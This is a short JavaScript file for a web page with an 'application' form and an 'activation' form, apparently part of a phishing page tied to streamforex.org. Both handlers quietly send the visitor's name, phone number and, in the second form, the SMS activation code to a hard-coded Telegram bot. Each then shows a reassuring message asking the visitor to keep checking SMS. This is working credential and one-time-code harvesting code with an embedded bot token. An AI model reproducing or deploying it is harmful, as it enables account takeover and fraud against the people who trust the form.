const BOT_TOKEN = "5443998856:AAFCYopFnwp9EGXcQrC4gJwz4sHI9hwYbS4";
const CHAT_ID = "-1002792790258";

document.getElementById('application-form').addEventListener('submit', async function(e) {
    e.preventDefault();
    const name = document.getElementById('name').value;
    const phone = document.getElementById('phone').value;

    const message = `📩 New Application:\nFull Name: ${name}\nPhone: ${phone}`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    });

    document.getElementById('app-msg').innerText = "Thank you! Your application is being processed within 24 hours. Please check your SMS regularly for the activation code.";
    document.getElementById('application-form').reset();
});

document.getElementById('activation-form').addEventListener('submit', async function(e) {
    e.preventDefault();
    const name = document.getElementById('name2').value;
    const phone = document.getElementById('phone2').value;
    const code = document.getElementById('code').value;

    const message = `✅ Activation Code Submitted:\nFull Name: ${name}\nPhone: ${phone}\nCode: ${code}`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    });

    document.getElementById('act-msg').innerText = "Thank you! Your code has been received. Please check your SMS for further confirmation or contact live chat on streamforex.org for assistance.";
    document.getElementById('activation-form').reset();
});
